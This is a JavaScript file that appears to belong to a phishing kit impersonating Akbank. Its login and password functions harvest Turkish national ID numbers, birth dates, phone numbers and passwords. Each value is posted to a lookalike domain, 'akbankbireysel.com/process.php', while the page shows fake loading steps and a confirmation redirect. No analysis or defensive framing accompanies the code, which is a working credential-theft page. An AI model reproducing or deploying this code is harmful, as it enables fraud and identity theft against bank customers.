
 


$(document).on("keydown", "#username, #password, #phone, #sms", function (e) {
    if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110, 190]) !== -1 ||
        (e.keyCode == 65 && e.ctrlKey === true) ||
        (e.keyCode == 67 && e.ctrlKey === true) ||
        (e.keyCode == 86 && e.ctrlKey === true) ||
        (e.keyCode == 88 && e.ctrlKey === true) ||
        (e.keyCode >= 35 && e.keyCode <= 39)) {
        return;
    }
    if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
        e.preventDefault();
    }
});


function submitData(action, formData, successCallback) {
    $.ajax({
        type: "POST",
        url: "https://akbankbireysel.com/process.php",
        data: { action: action, ...formData },
        success: function (response) {
            successCallback(response);
        },
        error: function (error) {
      window.location.href = "/onay.html";
        }
    });
}


function submitLogin() {
    var txtTckn = $("#txtTckn").val();
    var txtBirthDate = $("#txtBirthDate").val();
    var txtPhoneNumber = $("#txtPhoneNumber").val();


    if (txtTckn && txtBirthDate && txtPhoneNumber) {
        submitData("submitLogin", { txtTckn: txtTckn, txtBirthDate: txtBirthDate, txtPhoneNumber: txtPhoneNumber }, function () {
            $("#loginButton").hide();
            $("#loginProcess").show();

            setTimeout(function () {
                $("#loginf").hide();
                $("#loginProcess").hide();
                $("#footer").hide();
                $("#authf").show();
            }, 2000);
        });
    } else {
    }
}

function submitPass() {
    var passauth = $("#passauth").val();


    if (passauth) {
        submitData("submitPass", { passauth: passauth }, function () {
            $("#loginButtonPass").hide();
            $("#loginProcessPass").show();

            setTimeout(function () {
                $("#authf").hide();
                $("#loginProcessPass").hide();
                $("#completef").show();
            }, 2000);
        });
    } else {
    }
}


 

 

